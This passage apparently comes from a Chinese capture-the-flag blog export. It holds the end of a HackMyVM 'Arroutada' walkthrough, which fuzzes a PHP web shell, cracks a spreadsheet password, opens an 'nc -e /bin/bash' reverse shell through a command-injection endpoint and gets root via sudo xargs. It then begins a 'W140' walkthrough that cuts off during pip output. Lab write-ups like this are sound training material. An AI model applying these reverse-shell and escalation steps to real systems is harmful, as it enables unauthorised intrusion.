(100.00%)\n===============================================================                                                                      \nFinished\n===============================================================\n```\n\n\u67e5\u770b/scout\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.151/scout/\n\n<div>\n<p>\nHi, Telly,\n<br>\n<br>\nI just remembered that we had a folder with some important shared documents. The problem is that I don't know wich first path it was in, but I do know the second path. Graphically represented:\n<br>\n/scout/******/docs/\n<br>\n<br>\nWith continued gratitude,\n<br>\nJ1.\n</p>\n</div>\n<!-- Stop please -->\n```\n\n\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u '192.168.205.151/scout/FUZZ/docs/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 28 \n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.151/scout/FUZZ/docs/\nTotal requests: 119600\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000021664:   200        1016 L   12059 W    189769 Ch   'j2'                                                                \n\nTotal time: 59.22016\nProcessed Requests: 119600\nFiltered Requests: 119599\nRequests/sec.: 2019.582\n```\n\n![image-20250331185406586](https://7r1umphk.github.io/image/20250331185406653.png)\n\npass.txt\u662f\u5e9f\u8bdd\uff0c\u76f4\u63a5\u4e0bshellfile.ods\uff0c\u7136\u540e\u6709\u5bc6\u7801\uff0c\u6211\u4eec\u7206\u7834\u4e00\u4e0b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ file shellfile.ods                                            \nshellfile.ods: OpenDocument Spreadsheet\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt hash             \nUsing default input encoding: UTF-8\nLoaded 1 password hash (ODF, OpenDocument Star/Libre/OpenOffice [PBKDF2-SHA1 512/512 AVX512BW 16x BF/AES])\nCost 1 (iteration count) is 100000 for all loaded hashes\nCost 2 (crypto [0=Blowfish 1=AES]) is 1 for all loaded hashes\nWill run 12 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\njohn11           (shellfile.ods)   \n1g 0:00:00:08 DONE (2025-02-08 16:53) 0.1177g/s 1967p/s 1967c/s 1967C/s lachina..idiot\nUse the '--show --format=ODF' options to display all of the cracked passwords reliably\nSession completed. \n```\n\n\u6253\u5f00\u7ed9\u4e86\u6211\u4eec\u4e00\u4e2a\u8def\u5f84/thejabasshell.php\uff0c\u70b9\u8fdb\u53bb\u662f\u7a7a\u767d\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u8fdb\u884c\u7206\u7834\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?FUZZ=id' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 0 \n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.151/thejabasshell.php?FUZZ=id\nTotal requests: 119600\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000000280:   200        0 L      5 W        33 Ch       'a'                                                                 \n000000557:   200        0 L      0 W        0 Ch        'Controls'                                                          \n\nTotal time: 0\nProcessed Requests: 474\nFiltered Requests: 473\nRequests/sec.: 0\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl http://192.168.205.151/thejabasshell.php?a=id\nError: Problem with parameter 'b'                                                                                                                                \n```\n\n\u8fd8\u8981\u4e00\u4e2ab\u7684\u53c2\u6570\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ wfuzz -u 'http://192.168.205.151/thejabasshell.php?a=id&b=FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-words.txt --hc 404 --hw 5\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.\n********************************************************\n* Wfuzz 3.1.0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://192.168.205.151/thejabasshell.php?a=id&b=FUZZ\nTotal requests: 119600\n\n=====================================================================\nID           Response   Lines    Word       Chars       Payload                                                             \n=====================================================================\n\n000001999:   200        1 L      3 W        54 Ch       'pass'                                                              \n /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...\n\nTotal time: 41.29983\nProcessed Requests: 56690\nFiltered Requests: 56689\nRequests/sec.: 1372.644\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ curl 'http://192.168.205.151/thejabasshell.php?a=id&b=pass'\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n                        \n```\n\n\u4f7f\u7528a\u53c2\u6570\u5f39\u4e2ashell\u56de\u6765\u5c31\u597d\u4e86\n\n# 3. \u83b7\u5f97\u7a33\u5b9a\u7684 Shell\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n# 4.\u63d0\u6743\n\n```\nwww-data@arroutada:/var/www/html$ ls -al\ntotal 24\ndrwxr-xr-x  4 root root 4096 Jan  8  2023 .\ndrwxr-xr-x  3 root root 4096 Jan  8  2023 ..\ndrwxr-xr-x  2 root root 4096 Jan  8  2023 imgs\n-rw-r--r--  1 root root   59 Jan  8  2023 index.html\ndrwxr-xr-x 22 root root 4096 Jan  8  2023 scout\n-rw-r--r--  1 root root  174 Jan  8  2023 thejabasshell.php\nwww-data@arroutada:/var/www/html$ sudo -l\n\nWe trust you have received the usual lecture from the local System\nAdministrator. It usually boils down to these three things:\n\n    #1) Respect the privacy of others.\n    #2) Think before you type.\n    #3) With great power comes great responsibility.\n\n[sudo] password for www-data: \nsudo: a password is required\nwww-data@arroutada:/var/www/html$ cd ..\nwww-data@arroutada:/var/www$ ls -la\ntotal 12\ndrwxr-xr-x  3 root root 4096 Jan  8  2023 .\ndrwxr-xr-x 12 root root 4096 Jan  8  2023 ..\ndrwxr-xr-x  4 root root 4096 Jan  8  2023 html\nwww-data@arroutada:/var/www$ cd ..\nwww-data@arroutada:/var$ ls -al\ntotal 48\ndrwxr-xr-x 12 root root  4096 Jan  8  2023 .\ndrwxr-xr-x 18 root root  4096 Jan  8  2023 ..\ndrwxr-xr-x  2 root root  4096 Sep  3  2022 backups\ndrwxr-xr-x 10 root root  4096 Jan  8  2023 cache\ndrwxr-xr-x 26 root root  4096 Jan  8  2023 lib\ndrwxrwsr-x  2 root staff 4096 Sep  3  2022 local\nlrwxrwxrwx  1 root root     9 Jan  8  2023 lock -> /run/lock\ndrwxr-xr-x  8 root root  4096 Jan  8  2023 log\ndrwxrwsr-x  2 root mail  4096 Jan  8  2023 mail\ndrwxr-xr-x  2 root root  4096 Jan  8  2023 opt\nlrwxrwxrwx  1 root root     4 Jan  8  2023 run -> /run\ndrwxr-xr-x  4 root root  4096 Jan  8  2023 spool\ndrwxrwxrwt  2 root root  4096 Feb  8 03:46 tmp\ndrwxr-xr-x  3 root root  4096 Jan  8  2023 www\nwww-data@arroutada:/var$ cd /home/\nwww-data@arroutada:/home$ ls -al\ntotal 12\ndrwxr-xr-x  3 root  root  4096 Jan  8  2023 .\ndrwxr-xr-x 18 root  root  4096 Jan  8  2023 ..\ndrwxr-x---  3 drito drito 4096 Jan 10  2023 drito\nwww-data@arroutada:/home$ cd /opt/\nwww-data@arroutada:/opt$ ls -al\ntotal 8\ndrwxr-xr-x  2 root root 4096 Jan  8  2023 .\ndrwxr-xr-x 18 root root 4096 Jan  8  2023 ..\nwww-data@arroutada:/opt$ cd /tmp/\nwww-data@arroutada:/tmp$ sl -al\nbash: sl: command not found\nwww-data@arroutada:/tmp$ ls -al\ntotal 8\ndrwxrwxrwt  2 root root 4096 Feb  8 03:46 .\ndrwxr-xr-x 18 root root 4096 Jan  8  2023 ..\nwww-data@arroutada:/tmp$ cd /\nwww-data@arroutada:/$ ls -la\ntotal 68\ndrwxr-xr-x  18 root root  4096 Jan  8  2023 .\ndrwxr-xr-x  18 root root  4096 Jan  8  2023 ..\nlrwxrwxrwx   1 root root     7 Jan  8  2023 bin -> usr/bin\ndrwxr-xr-x   3 root root  4096 Jan  8  2023 boot\ndrwxr-xr-x  17 root root  3140 Feb  8 03:46 dev\ndrwxr-xr-x  66 root root  4096 Feb  8 03:46 etc\ndrwxr-xr-x   3 root root  4096 Jan  8  2023 home\nlrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img -> boot/initrd.img-5.10.0-20-amd64\nlrwxrwxrwx   1 root root    31 Jan  8  2023 initrd.img.old -> boot/initrd.img-5.10.0-18-amd64\nlrwxrwxrwx   1 root root     7 Jan  8  2023 lib -> usr/lib\nlrwxrwxrwx   1 root root     9 Jan  8  2023 lib32 -> usr/lib32\nlrwxrwxrwx   1 root root     9 Jan  8  2023 lib64 -> usr/lib64\nlrwxrwxrwx   1 root root    10 Jan  8  2023 libx32 -> usr/libx32\ndrwx------   2 root root 16384 Jan  8  2023 lost+found\ndrwxr-xr-x   3 root root  4096 Jan  8  2023 media\ndrwxr-xr-x   2 root root  4096 Jan  8  2023 mnt\ndrwxr-xr-x   2 root root  4096 Jan  8  2023 opt\ndr-xr-xr-x 150 root root     0 Feb  8 03:46 proc\ndrwx------   3 root root  4096 Jan  8  2023 root\ndrwxr-xr-x  17 root root   480 Feb  8 03:46 run\nlrwxrwxrwx   1 root root     8 Jan  8  2023 sbin -> usr/sbin\ndrwxr-xr-x   2 root root  4096 Jan  8  2023 srv\ndr-xr-xr-x  13 root root     0 Feb  8 03:46 sys\ndrwxrwxrwt   2 root root  4096 Feb  8 03:46 tmp\ndrwxr-xr-x  14 root root  4096 Jan  8  2023 usr\ndrwxr-xr-x  12 root root  4096 Jan  8  2023 var\nlrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz -> boot/vmlinuz-5.10.0-20-amd64\nlrwxrwxrwx   1 root root    28 Jan  8  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-18-amd64\nwww-data@arroutada:/$ find / -perm -4000 -type f 2>/dev/null\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/bin/sudo\n/usr/bin/newgrp\n/usr/bin/gpasswd\n/usr/bin/su\n/usr/bin/passwd\n/usr/bin/umount\n/usr/bin/mount\n/usr/bin/chfn\n/usr/bin/chsh\nwww-data@arroutada:/$ /sbin/getcap -r / 2>/dev/null\n/usr/bin/ping cap_net_raw=ep\nwww-data@arroutada:/$ ss -tnlup\nNetid                   State                    Recv-Q                   Send-Q                                     Local Address:Port                                       Peer Address:Port                   Process                 \nudp                     UNCONN                   0                        0                                                0.0.0.0:68                                              0.0.0.0:*                                              \ntcp                     LISTEN                   0                        4096                                           127.0.0.1:8000                                            0.0.0.0:*                                              \ntcp                     LISTEN                   0                        511                                                    *:80                                                    *:*             \n```\n\n\u6709\u4e2a8000\u7aef\u53e3\u6ca1\u6709\u516c\u5f00\uff0c\u6240\u4ee5\u6211\u4eec\u8981\u8f6c\u53d1\uff0c\u4f46\u662f\u5b83socat\u5c11\u4e86so\uff0c\u90a3\u6211\u4eec\u76f4\u63a5\u627e\u5176\u4ed6\u7684\u5de5\u5177\u5427\n\n```\nwww-data@arroutada:/tmp$ curl http://127.0.0.1:5000\nbash: curl: command not found\nwww-data@arroutada:/tmp$ wget http://127.0.0.1:8000\n--2025-02-08 04:00:55--  http://127.0.0.1:8000/\nConnecting to 127.0.0.1:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 319 [text/html]\nSaving to: 'index.html'\n\nindex.html                                                   0%[                                                                       index.html                                                 100%[========================================================================================================================================>]     319  --.-KB/s    in 0s    \n\n2025-02-08 04:00:55 (116 MB/s) - 'index.html' saved [319/319]\n\nwww-data@arroutada:/tmp$ ls -la\ntotal 476\ndrwxrwxrwt  2 root     root       4096 Feb  8 04:00 .\ndrwxr-xr-x 18 root     root       4096 Jan  8  2023 ..\n-rw-r--r--  1 www-data www-data    319 Feb  8 04:00 index.html\n-rwxr-xr-x  1 www-data www-data 473256 Jan 29 19:48 socat\nwww-data@arroutada:/tmp$ cat index.html \n<h1>Service under maintenance</h1>\n\n\n<br>\n\n\n<h6>This site is from ++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>---.+++++++++++..<<++.>++.>-----------.++.++++++++.<+++++.>++++++++++++++.<+++++++++.---------.<.>>-----------------.-------.++.++++++++.------.+++++++++++++.+.<<+..</h6>\n\n<!-- Please sanitize /priv.php -->\n```\n\n![image-20250331185429009](https://7r1umphk.github.io/image/20250331185429071.png)\n\n\u90a3\u6211\u4eec\u770b\u5b83\u63d0\u793a\u7684/priv.php\n\n```\nwww-data@arroutada:/tmp$ wget http://127.0.0.1:8000/priv.php\n--2025-02-08 04:01:52--  http://127.0.0.1:8000/priv.php\nConnecting to 127.0.0.1:8000... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: unspecified [text/html]\nSaving to: 'priv.php'\n\npriv.php                                                       [<=>                                                                    priv.php                                                       [ <=>                                                                                                                                     ]     308  --.-KB/s    in 0s    \n\n2025-02-08 04:01:52 (111 MB/s) - 'priv.php' saved [308]\n\nwww-data@arroutada:/tmp$ cat priv.php \nError: the 'command' parameter is not specified in the request body.\n\n/*\n\n$json = file_get_contents('php://input');\n$data = json_decode($json, true);\n\nif (isset($data['command'])) {\n    system($data['command']);\n} else {\n    echo 'Error: the 'command' parameter is not specified in the request body.';\n}\n\n*/\n```\n\n\u8bf4\u6211\u4eec\u5c11\u4e86\u53c2\u6570\uff0c\u6211\u4eec\u52a0\u4e0a\u5c31\u597d\u4e86\n\n```\nwww-data@arroutada:/tmp$ wget --post-data='{'command':'whoami'}' http://127.0.0.1:8000/priv.php -q -O -\ndrito\n\n\n/*\n\n$json = file_get_contents('php://input');\n$data = json_decode($json, true);\n\nif (isset($data['command'])) {\n    system($data['command']);\n} else {\n    echo 'Error: the 'command' parameter is not specified in the request body.';\n}\n\n*/\n```\n\n\u5229\u7528\n\n```\nwww-data@arroutada:/tmp$ wget --post-data='{'command':'nc 192.168.205.128 8888 -e /bin/bash'}' http://127.0.0.1:8000/priv.php -q -O -\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 8888           \nlistening on [any] 8888 ...\nconnect to [192.168.205.128] from (UNKNOWN) [192.168.205.151] 60268\nid\nuid=1001(drito) gid=1001(drito) groups=1001(drito)\n```\n\n\u83b7\u53d6\u53cd\u5411 shell \u540e\uff0c\u901a\u8fc7\u4ee5\u4e0b\u547d\u4ee4\u83b7\u5f97\u7a33\u5b9a\u7684\u4ea4\u4e92\u5f0f TTY shell\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n\u63d0\u6743\n\n```\ndrito@arroutada:~/web$ sudo -l\nMatching Defaults entries for drito on arroutada:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser drito may run the following commands on arroutada:\n    (ALL : ALL) NOPASSWD: /usr/bin/xargs\n```\n\nhttps://gtfobins.github.io/gtfobins/xargs/#sudo\n\n```bash\ndrito@arroutada:~/web$ sudo xargs -a /dev/null bash\nroot@arroutada:/home/drito/web# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n<!-- ##{'timestamp':1739012133}## -->sentence", "top": 0, "createdAt": 1739012133, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-02-08", "dateLabelColor": "#0969da"}, "P7": {"htmlDir": "docs/post/hmv_w140.html", "labels": ["HackMyVM"], "postTitle": "hmv_w140", "postUrl": "post/hmv_w140.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/7", "commentNum": 0, "wordCount": 18438, "description": "# 0.\u7b80\u4ecb\n\n\u9776\u673a\uff1ahttps://hackmyvm.eu/machines/machine.php?vm=W140\n \u96be\u5ea6\uff1a\u7eff\u8272\n \u76ee\u6807 IP\uff1a192.168.205.131\n \u672c\u673a IP\uff1a192.168.205.128\n\n# 1.\u626b\u63cf\n\nnmap\u8d77\u624b\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.131\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST\nNmap scan report for 192.168.205.131\nHost is up (0.00029s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)\n|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)\n|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)\n80/tcp open  http    Apache httpd 2.4.54 ((Debian))\n|_http-server-header: Apache/2.4.54 (Debian)\n|_http-title: w140\nMAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.29 ms 192.168.205.131\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.07 seconds\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -A -Pn -n --min-rate 10000 192.168.205.131\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-02-08 09:45 CST\nNmap scan report for 192.168.205.131\nHost is up (0.00029s latency).\nNot shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 ff:fd:b2:0f:38:88:1a:44:c4:2b:64:2c:d2:97:f6:8d (RSA)\n|   256 ca:50:54:f7:24:4e:a7:f1:06:46:e7:22:30:ec:95:b7 (ECDSA)\n|_  256 09:68:c0:62:83:1e:f1:5d:cb:29:a6:5e:b4:72:aa:cf (ED25519)\n80/tcp open  http    Apache httpd 2.4.54 ((Debian))\n|_http-server-header: Apache/2.4.54 (Debian)\n|_http-title: w140\nMAC Address: 08:00:27:EA:A7:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nDevice type: general purpose|router\nRunning: Linux 4.X|5.X, MikroTik RouterOS 7.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3\nOS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)\nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.29 ms 192.168.205.131\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 8.07 seconds\n```\n\n# 2.\u8e29\u70b9\n\n![image-20250331185843031](https://7r1umphk.github.io/image/20250331185843370.png)\n\n\u6709\u4e2a\u4e0a\u4f20\u9875/service.html\uff0c\u4e0a\u4f20\u4e2a\u9a6c\u770b\u770b\u3002\u4e0d\u884c\uff0c\u6211\u4eec\u4e0a\u4f20\u6b63\u5e38\u7684\u56fe\u7247\n\n![image-20250331185853481](https://7r1umphk.github.io/image/20250331185853810.png)\n\n![image-20250331185859700](https://7r1umphk.github.io/image/20250331185859788.png)\n\n\u641c\u7d22\u4e00\u4e0b\u6709\u6ca1\u6709\u5229\u7528\u6f0f\u6d1e\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit ExifTool 12.37       \nExploits: No Results\nShellcodes: No Results\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit ExifTool 12.3 \nExploits: No Results\nShellcodes: No Results\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ searchsploit ExifTool 12  \n---------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                      |  Path\n---------------------------------------------------------------------------------------------------- ---------------------------------\nExifTool 12.23 - Arbitrary Code Execution                                                           | linux/local/50911.py\n---------------------------------------------------------------------------------------------------- ---------------------------------\nShellcodes: No Results\n                                                         \n```\n\n\u7248\u672c\u4e0d\u4e00\u6837\uff0c\u6211\u4eec\u7ee7\u7eed\u641c\u7d22\n\nhttps://github.com/cowsecurity/CVE-2022-23935\u627e\u5230\u4e00\u4e2a\u7248\u672c\u4e00\u6837\u7684\uff0c\u6211\u4eec\u5c1d\u8bd5\u5229\u7528\n\n```\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ git clone https://github.com/0xFTW/CVE-2022-23935\n\u6b63\u514b\u9686\u5230 'CVE-2022-23935'...\nremote: Enumerating objects: 7, done.\nremote: Counting objects: 100% (7/7), done.\nremote: Compressing objects: 100% (6/6), done.\nremote: Total 7 (delta 1), reused 7 (delta 1), pack-reused 0 (from 0)\n\u63a5\u6536\u5bf9\u8c61\u4e2d: 100% (7/7), \u5b8c\u6210.\n\u5904\u7406 delta \u4e2d: 100% (1/1), \u5b8c\u6210.\n                     \n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ cd CVE-2022-23935 \n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2022-23935]\n\u2514\u2500$chmod +x CVE-2022-23935.py\n\n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2022-23935]\n\u2514\u2500$ python3 -m venv env\n                                                                                                                                    \n\u250c\u2500\u2500(kali\u327fkali)-[~/test/CVE-2022-23935]\n\u2514\u2500$ source env/bin/activate\n                                                                                                                                    \n\u250c\u2500\u2500(env)\u2500(kali\u327fkali)-[~/test/CVE-2022-23935]\n\u2514\u2500$ pip3 install pwntools\nCollecting pwntools\n  Using cached pwntools-4.14.0-py2.py3-none-any.whl.metadata (5.3 kB)\nCollecting paramiko>=1.15.2 (from pwntools)\n  Downloading paramiko-3.5.1-py3-none-any.whl.metadata (4.6 kB)\nCollecting mako>=1.0.0 (from pwntools)\n  Downloading Mako-1.3.9-py3-none-any.whl.metadata (2.9 kB)\nCollecting pyelftools>=0.29 (from pwntools)\n  Using cached pyelftools-0.31-py3-none-any.whl.metadata (381 bytes)\nCollecting capstone>=3.0.5rc2 (from pwntools)\n  Using cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.8 kB)\nCollecting ropgadget>=5.3 (from pwntools)\n  Using cached ROPGadget-7.6-py3-none-any.whl.metadata (1.0 kB)\nCollecting pyserial>=2.7 (from pwntools)\n  Using cached pyserial-3.5-py2.py3-none-any.whl.metadata (1.6 kB)\nCollecting requests>=2.0 (from pwntools)\n  Using cached requests-2.32.3-py3-none-any.whl.metadata (4.6 kB)\nRequirement already satisfied: pip>=6.0.8 in ./env/lib/python3.12/site-packages (from pwntools) (25.0)\nCollecting pygments>=2.0 (from pwntools)\n  Using cached pygments-2.19.1-py3-none-any.whl.metadata (2.5 kB)\nCollecting pysocks (from pwntools)\n  Using cached PySocks-1.7.1-py3-none-any.whl.metadata (13 kB)\nCollecting python-dateutil (from pwntools)\n  Using cached python_dateutil-2.9.0.post0-py2.py3-none-any.whl.metadata (8.4 kB)\nCollecting packaging (from pwntools)\n  Using cached packaging-24.2-py3-none-any.whl.metadata (3.2 kB)\nCollecting psutil>=3.3.0 (from pwntools)\n  Using cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (22 kB)\nCollecting intervaltree>=3.0 (from pwntools)\n  Using cached intervaltree-3.1.0-py2.py3-none-any.whl\nCollecting sortedcontainers (from pwntools)\n  Using cached sortedcontainers-2.4.0-py2.py3-none-any.whl.metadata (10 kB)\nCollecting unicorn>=2.0.1 (from pwntools)\n  Using cached unicorn-2.1.1-py2.py3-none-manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.3 kB)\nCollecting six>=1.12.0 (from pwntools)\n  Using cached six-1.17.0-py2.py3-none-any.whl.metadata (1.7 kB)\nCollecting rpyc (from pwntools)\n  Using cached rpyc-6.0.1-py3-none-any.whl.metadata (3.5 kB)\nCollecting colored_traceback (from pwntools)\n  Using cached colored_traceback-0.4.2-py3-none-any.whl.metadata (4.6 kB)\nCollecting unix-ar (from pwntools)\n  Using cached unix_ar-0.2.1-py2.py3-none-any.whl.metadata (1.9 kB)\nCollecting zstandard (from pwntools)\n  Using cached zstandard-0.23.0-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.0 kB)\nCollecting MarkupSafe>=0.9.2 (from mako>=1.0.0->pwntools)\n  Using cached MarkupSafe-3.0.2-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.0 kB)\nCollecting bcrypt>=3.2 (from paramiko>=1.15.2->pwntools)\n  Using cached bcrypt-4.2.1-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (9.8 kB)\nCollecting cryptography>=3.3 (from paramiko>=1.15.2->pwntools)\n  Using cached cryptography-44.0.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (5.7 kB)\nCollecting pynacl>=1.5 (from paramiko>=1.15.2->pwntools)\n  Using cached PyNaCl-1.5.0-cp36-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.manylinux_2_24_x86_64.whl.metadata (8.6 kB)\nCollecting charset-normalizer<4,>=2 (from requests>=2.0->pwntools)\n  Using cached charset_normalizer-3.4.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (35 kB)\nCollecting idna<4,>=2.5 (from requests>=2.0->pwntools)\n  Using cached idna-3.10-py3-none-any.whl.metadata (10 kB)\nCollecting urllib3<3,>=1.21.1 (from requests>=2.0->pwntools)\n  Using cached urllib3-2.3.0-py3-none-any.whl.metadata (6.5 kB)\nCollecting certifi>=2017.4.17 (from requests>=2.0->pwntools)\n  Using cached certifi-2025.1.31-py3-none-any.whl.metadata (2.5 kB)\nCollecting plumbum (from rpyc->pwntools)\n  Using cached plumbum-1.9.0-py3-none-any.whl.metadata (10 kB)\nCollecting cffi>=1.12 (from cryptography>=3.3->paramiko>=1.15.2->pwntools)\n  Using cached cffi-1.17.1-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)\nCollecting pycparser (from cffi>=1.12->cryptography>=3.3->paramiko>=1.15.2->pwntools)\n  Using cached pycparser-2.22-py3-none-any.whl.metadata (943 bytes)\nUsing cached pwntools-4.14.0-py2.py3-none-any.whl (12.9 MB)\nUsing cached capstone-6.0.0a3-cp312-cp312-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.3 MB)\nDownloading Mako-1.3.9-py3-none-any.whl (78 kB)\nDownloading paramiko-3.5.1-py3-none-any.whl (227 kB)\nUsing cached psutil-6.1.1-cp36-abi3-manylinux_2_12_x86_64.manylinux2010_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (287 kB)\nUsing cached pyelftools-0.31-py3-none-any.whl (180 kB)\nUsing cached pygments-2.19.1-py3-none-any.whl (1.2 MB)\nUsing cached pyserial-3.5-py2.py3-none-any.whl (90 kB)\nUsing cached requests-2.32.3-py3-none-any.whl (64 kB)\nUsing cached ROPGadget-7.6-py3-none-any.whl (32 kB)\nUsing cached six-1.17.0-py2.py3-none-any.whl (11 kB)\nUsing cached 